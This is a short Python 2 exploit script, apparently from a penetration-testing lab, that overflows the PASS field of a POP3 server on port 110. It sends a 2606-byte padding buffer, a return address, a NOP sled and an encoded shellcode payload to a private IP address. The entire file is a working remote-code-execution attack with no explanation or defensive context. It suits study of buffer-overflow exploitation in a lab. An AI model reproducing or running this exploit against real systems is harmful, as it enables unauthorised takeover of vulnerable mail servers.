#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)






shellcode = ("\xbd\xd8\x93\x2d\xbe\xdb\xde\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x6b\x12\x83\xc3\x04\x03\xb3\x9d\xcf\x4b\xbf\x4a\x8d"
"\xb4\x3f\x8b\xf2\x3d\xda\xba\x32\x59\xaf\xed\x82\x29\xfd\x01"
"\x68\x7f\x15\x91\x1c\xa8\x1a\x12\xaa\x8e\x15\xa3\x87\xf3\x34"
"\x27\xda\x27\x96\x16\x15\x3a\xd7\x5f\x48\xb7\x85\x08\x06\x6a"
"\x39\x3c\x52\xb7\xb2\x0e\x72\xbf\x27\xc6\x75\xee\xf6\x5c\x2c"
"\x30\xf9\xb1\x44\x79\xe1\xd6\x61\x33\x9a\x2d\x1d\xc2\x4a\x7c"
"\xde\x69\xb3\xb0\x2d\x73\xf4\x77\xce\x06\x0c\x84\x73\x11\xcb"
"\xf6\xaf\x94\xcf\x51\x3b\x0e\x2b\x63\xe8\xc9\xb8\x6f\x45\x9d"
"\xe6\x73\x58\x72\x9d\x88\xd1\x75\x71\x19\xa1\x51\x55\x41\x71"
"\xfb\xcc\x2f\xd4\x04\x0e\x90\x89\xa0\x45\x3d\xdd\xd8\x04\x2a"
"\x12\xd1\xb6\xaa\x3c\x62\xc5\x98\xe3\xd8\x41\x91\x6c\xc7\x96"
"\xd6\x46\xbf\x08\x29\x69\xc0\x01\xee\x3d\x90\x39\xc7\x3d\x7b"
"\xb9\xe8\xeb\x2c\xe9\x46\x44\x8d\x59\x27\x34\x65\xb3\xa8\x6b"
"\x95\xbc\x62\x04\x3c\x47\xe5\x21\xca\x47\xb0\x5d\xce\x47\x3b"
"\x25\x47\xa1\x51\x49\x0e\x7a\xce\xf0\x0b\xf0\x6f\xfc\x81\x7d"
"\xaf\x76\x26\x82\x7e\x7f\x43\x90\x17\x8f\x1e\xca\xbe\x90\xb4"
"\x62\x5c\x02\x53\x72\x2b\x3f\xcc\x25\x7c\xf1\x05\xa3\x90\xa8"
"\xbf\xd1\x68\x2c\x87\x51\xb7\x8d\x06\x58\x3a\xa9\x2c\x4a\x82"
"\x32\x69\x3e\x5a\x65\x27\xe8\x1c\xdf\x89\x42\xf7\x8c\x43\x02"
"\x8e\xfe\x53\x54\x8f\x2a\x22\xb8\x3e\x83\x73\xc7\x8f\x43\x74"
"\xb0\xed\xf3\x7b\x6b\xb6\x14\x9e\xb9\xc3\xbc\x07\x28\x6e\xa1"
"\xb7\x87\xad\xdc\x3b\x2d\x4e\x1b\x23\x44\x4b\x67\xe3\xb5\x21"
"\xf8\x86\xb9\x96\xf9\x82")

buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode +"C"*(3500-2606-4-16-351)


try:
    print "\nSending evil buffer..."
    s.connect(('10.11.22.89',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer +'\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"

